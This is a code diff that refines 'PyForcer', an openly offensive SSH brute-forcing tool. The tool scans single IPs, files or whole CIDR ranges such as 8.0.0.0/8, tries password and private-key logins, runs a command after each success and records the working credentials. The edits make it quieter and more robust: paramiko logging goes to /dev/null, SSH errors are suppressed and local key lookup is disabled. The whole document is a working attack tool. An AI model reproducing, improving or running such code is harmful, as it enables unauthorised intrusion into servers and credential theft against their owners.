@@ -9,6 +9,7 @@ import ipaddress
 import concurrent.futures
 print_lock = threading.Lock()
 file_write_lock = threading.Lock()
+paramiko.util.log_to_file('/dev/null')
 timeout = 10
 
 def safe_print(message):
@@ -21,8 +22,7 @@ def safe_write(file, content):
             f.write(content + "\n")
 
 def resolve_cidr(cidr):
-    ip_addresses = [str(ip) for ip in ipaddress.IPv4Network(cidr, strict=False)]
-    return ip_addresses
+    return (str(ip) for ip in ipaddress.IPv4Network(cidr, strict=False))
 
 def is_valid_ipv4(ip):
     try:
@@ -86,7 +86,7 @@ def check_success_condition(ssh_client, cmd):
     except Exception as e:
         safe_print(f"ERROR: could not run command on {ssh_client.get_transport().getpeername()[0]}: {e}")
         return False
-    
+ 
 def store_successful_login(file, credentials, string):
     with open(file, 'a') as f:
         for string in credentials:
@@ -100,21 +100,18 @@ def test_ssh_credentials(ip, port, credentials, key_file, output, cmd, private_k
             ssh_client.set_missing_host_key_policy(CustomAutoAddPolicy('SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u2'))
             auth_method = None
 
-            if private_key:
+            if key_file:
                 try:
-                    ssh_client.connect(ip, port=port, username=username, pkey=private_key, timeout=timeout)
+                    ssh_client.connect(ip, port=port, username=username, pkey=private_key, timeout=timeout, look_for_keys=False)
                     auth_method = "key"
                 except paramiko.AuthenticationException:
                     if debug == True:
                         safe_print(f"ERROR: unable to authenticate on {ip}:{port} as {username} using {key_file}")
                     else:
                         pass
-            else:
-                safe_print(f"{key_file} is not of a valid private key type.")
-
             if not auth_method:
                 try:
-                    ssh_client.connect(ip, port=port, username=username, password=password, timeout=timeout, pkey=None)
+                    ssh_client.connect(ip, port=port, username=username, password=password, timeout=timeout, pkey=None, look_for_keys=False)
                     auth_method = "password"
                 except paramiko.AuthenticationException:
                     if debug == True:
@@ -131,6 +128,10 @@ def test_ssh_credentials(ip, port, credentials, key_file, output, cmd, private_k
                 safe_write(output, result)
                 safe_print(result)
 
+        except paramiko.ssh_exception.SSHException:
+            pass
+        except ConnectionResetError:
+            pass
         except paramiko.AuthenticationException:
             if debug == True:
                 print(f"Authentication failed for {ip}:{port} - {username}:{password}")
@@ -144,9 +145,7 @@ def test_ssh_credentials(ip, port, credentials, key_file, output, cmd, private_k
 
 def main():
     try:
-        # Create a parser for command-line arguments
         parser = argparse.ArgumentParser(description="PyForcer  is an all-in-one SSH brute forcing tool for username+password and private keyfile combinations. Capabilities include: CIDR handling, private keys, multi-threading, error handling.")
-        # Add arguments
         parser.add_argument("input", help="Target hosts to exploit, [ex: filename, 8.0.0.0/8, 8.8.8.8]")
         parser.add_argument("output", help="Path to the output file")
         parser.add_argument("--port", type=int, default=22, help="Port number (default: 22)")
@@ -155,9 +154,9 @@ def main():
         parser.add_argument("--threads", type=int, default=10, choices=range(1, 101), help="Number of threads to run concurrently (10 default/100 max)")
         parser.add_argument("--cmd", default="uname -a", help="Command to run after successful login (default: uname -a)")
         parser.add_argument("--debug", default=False, action="store_true", help="Enable the script's debugging features.")
-        # Parse the arguments
         private_key_type, private_key = None, None
         args = parser.parse_args()
+        safe_print("PyForcer - SSH bruteforcing done properly.")
         if args.debug:
             paramiko.common.logging.basicConfig(level=paramiko.common.DEBUG)
         if args.input:
@@ -166,8 +165,8 @@ def main():
             elif os.path.isfile(args.input):
                 with open(args.input, "r") as file:
                     ip_addresses = [line.strip() for line in file]
-            elif '/' in args.input:  # Check for CIDR notation
-                ip_addresses = resolve_cidr(args.input)
+            elif '/' in args.input:
+                ip_addresses = list(resolve_cidr(args.input))
             else:
                 safe_print(f"ERROR: \"{args.input}\" is not a valid IP address, CIDR notation, or file does not exist.")
                 return
@@ -190,7 +189,6 @@ def main():
         if not any(match in args.cmd for match in ["uname", "whoami"]):
             safe_print(f"\n\n!!! WARNING !!! specified command has no extra verification, false positives are likely.\n\n")
 
-        safe_print("PyForcer - SSH bruteforcing done properly.")
         safe_print(f"\tTarget(s): {args.input}")
         safe_print(f"\tPort: {args.port}")
         safe_print(f"\tLoaded {count} credentials from file: {args.creds}")
